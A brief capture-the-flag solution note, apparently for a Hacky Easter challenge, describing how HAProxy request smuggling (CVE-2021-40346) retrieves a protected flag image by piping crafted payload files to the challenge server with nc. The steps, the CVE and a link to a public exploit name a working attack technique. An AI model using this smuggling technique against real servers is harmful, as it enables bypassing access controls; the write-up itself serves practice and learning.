# solution

1. run `cat src/payload | nc ch.hackyeaster.com 2406`
   -  find the image's URL (which is also protected)
   -  `/static/flag-55a8408e060a25096eb95be8b86f3a2c66f91193.png `HTTP/1.1`
2. prepare another payload (which Content-Length adjusted)
3. run `cat src/payload2 | nc ch.hackyeaster.com 2406` > img_response.txt
4. cut off the first lines of the response (headers), to get the body only (PNG)
5. open the PNG

# idea outline

- HAProxy Request smuggling
- CVE-2021-40346
- dir listing is open -> HAProxy can be recognized
- request smuggling to call /flag
- https://github.com/alexOarga/CVE-2021-40346


# notes

- burger image from https://w7.pngwing.com/pngs/231/735/png-transparent-hamburger-illustration-hamburger-whopper-fast-food-bacon-chicken-nugget-double-burger-food-beef-recipe-thumbnail.png 
- free for non-commercial use
